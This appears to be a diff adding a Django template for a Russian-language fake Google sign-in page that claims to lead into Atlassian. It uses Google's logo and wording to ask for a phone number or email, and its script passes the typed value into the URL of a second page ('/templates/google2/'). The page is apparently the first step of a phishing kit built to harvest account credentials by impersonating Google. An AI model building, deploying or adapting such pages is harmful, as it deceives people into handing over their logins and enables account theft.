@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+    {% load static %}
+    <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="{% static 'css/google.css' %}">
+    <title>Document</title>
+</head>
+<body>
+    <div id="center">
+        <div class="top">
+            <img src="https://www.freepnglogos.com/uploads/google-logo-png/google-logo-png-suite-everything-you-need-know-about-google-newest-0.png" alt="Girl in a jacket" width="25" height="15">
+            <em style="font-size: small;">Войдите в аккаунт Google</em>
+        </div>
+        <div id="middle">
+            <div id="content">  
+                <div class="headline">
+                    <h2 style="background-color: rgb(255, 255, 255); text-align: center; font-family:'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;font-weight: 10;">Вход</h2>
+                    <h4 style="background-color: rgb(255, 255, 255); text-align: center; font-family:'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;font-weight: 50;">Переход в приложение " <a style="text-align: center;font-weight: 100; font: bold; text-decoration:none; color: rgb(53, 116, 224);" href=""> <strong>Atlassian</strong></a> "</h4>
+                </div>
+                <div class="form__div" >
+                    <input id="login" type="Телефон или адрес эл. почты" class="form__input" placeholder=" ">
+                    <label for=""  class="form__label">Телефон или адрес эл. почты</label>
+                </div>
+                <div style="margin-bottom: 3rem;"> 
+                    <a style=" text-decoration:none; color: rgb(53, 116, 224);" href=""> <strong style="font-family:'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;text-align: center; font-size: 14px;">Забыли адрес электронной почты?</strong></a> 
+                </div>
+                <div id="bottomButtons">
+                    <a style="margin-bottom: auto;margin-top: auto; text-decoration:none; color: rgb(53, 116, 224);font-family:'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;" href="">Создать аккаунт</a> 
+                    <button id="next" class="button">Далее</a>
+                </div>
+                <script>
+                    const button = document.getElementById("next")
+                    const input = document.getElementById("login")
+                    button.addEventListener("click", ()=>{
+                        window.location.href="/templates/google2/"+input.value
+                    })
+                </script>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
